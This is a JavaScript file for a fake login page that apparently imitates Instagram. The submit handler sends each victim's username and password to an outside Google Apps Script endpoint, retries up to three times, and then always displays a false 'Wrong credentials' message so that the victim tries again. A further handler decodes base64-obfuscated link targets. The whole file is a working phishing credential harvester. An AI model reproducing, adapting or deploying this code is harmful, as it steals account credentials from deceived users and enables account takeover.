document.addEventListener('DOMContentLoaded', () => {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('login-button');
    const splashScreen = document.getElementById('splash-screen');
    const loginForm = document.getElementById('login-form');
    const showHideButton = document.querySelector('.show-hide-password');
    const showHideText = document.querySelector('.show-hide-text');
    const eyeOpenIcon = document.getElementById('eye-open');
    const eyeClosedIcon = document.getElementById('eye-closed');
    const instaLogo = document.querySelector('.insta-logo'); // Get the logo element

    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyuvK7JZPUQvtlOmZluz4nZPxBhLXIWFWkJm2o65PgEMECw9vR3U7_m-jlaEusv0mvaDg/exec';
    
    // Define logo URLs for easy management
    const lightModeLogo = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZ4_b4IC88VF6Yktpge1s0B8jDRW8lunNVL-OvZkNLPjFFF-HLHqEwKYsp8eZbjjjPBVz75GaPTC3_I41JE95W8LjpdFTgNj1ha6qM9B2KVUXHC44T0KEwDjlVS3DL_FhpMitCn56BQZv0dHODgJjDf8qVEnAA7iRCPdV5JkpKuUm8KBzbG83gu86L3hcv/s1600/4.png';
    const darkModeLogo = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlefH02PFuImozeitEEAZaLYaNNBuFeaoGQ9zBtcvFVU1dTS_volNhLYU4_dtOvxtzxAvAgJcddSzWF5gV1nf2dDmzKzdGQAEaX_0ieYZsV4OF6v4n2FPOs1Kyln7vFgAkJvUGG8mIOakdC-T_Oa5ge5RWyQOwtx5P0Lw6_k1NLs_HVuAuYrfGy_bd2nuL/s1600/3.png';

    window.onload = () => {
        splashScreen.classList.add('fade-out');
        setTimeout(() => {
            splashScreen.style.display = 'none';
        }, 500);
    };

    // --- START: Robust Theme Switching Code ---
    function applyTheme(isDark) {
        document.body.classList.toggle('dark-mode', isDark);

        // NEW: Check if the desktop logo exists and update its source
        if (instaLogo) {
            if (isDark) {
                instaLogo.src = darkModeLogo;
            } else {
                instaLogo.src = lightModeLogo;
            }
        }
    }

    const colorSchemeQuery = window.matchMedia('(prefers-color-scheme: dark)');
    
    // Apply theme on initial page load
    applyTheme(colorSchemeQuery.matches);
    
    // Listen for future theme changes
    colorSchemeQuery.addEventListener('change', (e) => {
        applyTheme(e.matches);
    });
    // --- END: Robust Theme Switching Code ---

    function initPasswordToggle() {
        if (!passwordInput || !showHideButton) return;
        
        passwordInput.addEventListener('input', function() {
            showHideButton.classList.toggle('visible', this.value.length > 0);
            checkInputs();
        });
        
        showHideButton.addEventListener('click', function() {
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            
            if (showHideText) {
                showHideText.textContent = isPassword ? 'Hide' : 'Show';
            }
            
            eyeOpenIcon.style.display = isPassword ? 'none' : 'block';
            eyeClosedIcon.style.display = isPassword ? 'block' : 'none';
            
            passwordInput.focus();
        });
    }

    function checkInputs() {
        const isUsernameFilled = usernameInput.value.trim() !== '';
        const isPasswordFilled = passwordInput.value.trim() !== '';
        const isPasswordValid = passwordInput.value.trim().length >= 6;
        loginButton.disabled = !(isUsernameFilled && isPasswordFilled && isPasswordValid);
    }

    usernameInput.addEventListener('input', checkInputs);
    passwordInput.addEventListener('input', checkInputs);

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (loginButton.disabled) return;
        
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        removeCredentialError();
        showLoadingState();

        await submitViaFetch(username, password);
        
        setTimeout(() => {
            resetLoginButton();
            showCredentialError();
            passwordInput.value = '';
            checkInputs();
            
            if (showHideButton) {
                showHideButton.classList.remove('visible');
                passwordInput.type = 'password';
                
                if (showHideText) {
                   showHideText.textContent = 'Show';
                }
                eyeOpenIcon.style.display = 'block';
                eyeClosedIcon.style.display = 'none';
            }
        }, 1500);
    });

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    async function submitViaFetch(username, password) {
        const url = `${GOOGLE_SCRIPT_URL}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&t=${Date.now()}`;
        const maxRetries = 3; 

        for (let attempt = 0; attempt < maxRetries; attempt++) {
            try {
                await fetch(url, {
                    method: 'GET',
                    mode: 'no-cors',
                    cache: 'no-cache'
                });
                
                console.log(`Attempt ${attempt + 1} succeeded.`);
                return; 
                
            } catch (error) {
                console.error(`Attempt ${attempt + 1} failed:`, error);
                
                if (attempt < maxRetries - 1) {
                    await sleep(1000); 
                } else {
                    console.error('All submission attempts failed.');
                }
            }
        }
    }

    function showLoadingState() {
        loginButton.disabled = true;
        loginButton.innerHTML = '<div class="loading-spinner"></div>';
    }

    function resetLoginButton() {
        loginButton.disabled = false;
        loginButton.textContent = 'Log in';
    }

    function showCredentialError() {
        removeCredentialError();
        const errorElement = document.createElement('div');
        errorElement.className = 'credential-error';
        errorElement.innerHTML = `<div style="color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px;">Wrong credentials. Please try again.</div>`;
        
        const forgotLink = document.querySelector('.forgot-password');
        if (forgotLink) {
            forgotLink.parentNode.insertBefore(errorElement, forgotLink.nextSibling);
        } else {
            loginForm.parentNode.appendChild(errorElement);
        }
    }

    function removeCredentialError() {
        document.querySelectorAll('.credential-error').forEach(e => e.remove());
    }

    initPasswordToggle();
    checkInputs();
    
    document.querySelectorAll(".secure-link").forEach(a => {
        a.addEventListener("click", e => {
            e.preventDefault();
            const key = "123noob";
            const encrypted = a.getAttribute("data-enc");
            try {
                const decoded = atob(encrypted);
                const link = decoded.startsWith(key) ? decoded.slice(key.length) : null;
                if (link) {
                    window.open(link, "_blank");
                }
            } catch (err) {
                console.error("Decryption failed.", err);
            }
        });
    });
});
